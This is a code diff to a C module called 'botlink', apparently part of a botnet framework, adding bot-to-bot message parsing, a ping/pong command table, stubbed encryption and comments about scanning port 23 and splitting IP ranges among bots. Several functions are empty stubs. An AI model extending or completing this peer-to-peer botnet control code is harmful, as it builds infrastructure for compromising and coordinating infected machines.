@@ -9,6 +9,8 @@ we also want other protocols to be able to feed messages here
 
 if it cannot connect for X time.. it could use desperate() to port scan for bot port,
 also it can start checking every port 23 found for bot port since half the search is over
+
+ip generate seed can be used to ensure different bots scan different IPs
 */
 #include <stdio.h>
 #include <stdlib.h>
@@ -43,12 +45,12 @@ enum {
 };
 
 
-
 typedef struct _bot_header {
     uint32_t magic;
     uint16_t len;
     uint32_t checksum;
 } BotMSGHdr;
+
 
 // verify the packet is correct and has the entire packet..
 int BotMSGVerify(char *buf, int size) {
@@ -129,8 +131,8 @@ Modules HACK_botlink = {
 // botlink desperate
 // if we desperately need to attempt to connect to nodes.. we can port scan
 int botlink_desperate() {
-    Portscan_Add(&HACK_botlink, BOT_PORT);
-    Portscan_Enable(BOT_PORT, 1);
+    //Portscan_Add(&HACK_botlink, BOT_PORT);
+    //Portscan_Enable(BOT_PORT, 1);
 }
 
 // initialize the module
@@ -156,12 +158,20 @@ int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
 int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size) {
     BotVariables *vars = BotVars(cptr);
     if (!vars || vars->key_size == 0) return *size;
+    
+    // perform encryption
+    
+    return *size;
 }
 
 // will handle decryption for communication with other bots
 int botlink_read(Modules *mptr, Connection *cptr, char **buf, int *size) {
     BotVariables *vars = BotVars(cptr);
     if (!vars || vars->key_size == 0) return *size;
+    
+    // perform decryption
+    
+    return *size;
 }
 
 
@@ -180,6 +190,7 @@ int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         { BOT_PERFECT, &botlink_message },
         { 0, NULL }
     };
+    BotMSGHdr *_hdr = (BotMSGHdr *)buf;
     
     // ensure we have bot variables.. if not we wanna kill it
     if (vars == NULL) return ret;
@@ -190,6 +201,7 @@ int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
     // if it doesnt, or needs more data.. return that value
     if (i <= 0) return i;
 
+    
     // ret = -1.. so if the function/state isnt found
     // itll break the connection.. and the function needs to return 1 to remove msgs
     for (i = 0; BotlinkParsers[i].function != NULL; i++) {
@@ -199,6 +211,10 @@ int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
         }
     }
     
+    // lets chop this buffer down by removing this command.. in case
+    // a subsequent command was merged
+    QueueChopBuf(cptr, buf, sizeof(BotMSGHdr) + _hdr->len);
+
     // we dont need the message anymore..
     return ret;
 }
@@ -226,8 +242,52 @@ int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
     return 1;
 }
 
+
+char *bot_push_cmd(unsigned char cmd, char *fmt, ...) {
+    
+}
+
+enum {
+    BOT_CMD_PING,
+    BOT_CMD_PONG,
+    BOT_CMD_HIGH
+};
+
+int bot_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size) {
+    
+}
+
+
 int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size) {
+    int ret = 1;
+    int i = 0;
     BotVariables *vars = BotVars(cptr);
+    CMDHdr *hdr = (CMDHdr *)buf;
+    struct _bot_commands {
+        unsigned char cmd;
+        module_func function;
+        unsigned short size;
+    } BotCommands[] = {
+        { BOT_CMD_PING, &bot_cmd_ping, 0 },
+        { BOT_CMD_PONG, NULL, 0 },
+        { 0, NULL }
+    };
+    
+    
+    // if we do not have the full packet yet..
+    if (size < sizeof(CMDHdr))
+        return 0;
+    
+    for (; BotCommands[i].function != NULL; i++) {
+        if (BotCommands[i].cmd == hdr->cmd) {
+            // we have to make sure the entire packet for this command exists
+            if (size < (hdr->size + BotCommands[i].size))
+                return 0;
+                
+            BotCommands[i].function(mptr, cptr, buf, size);
+            
+        }
+    }
     
     return 1;
 }
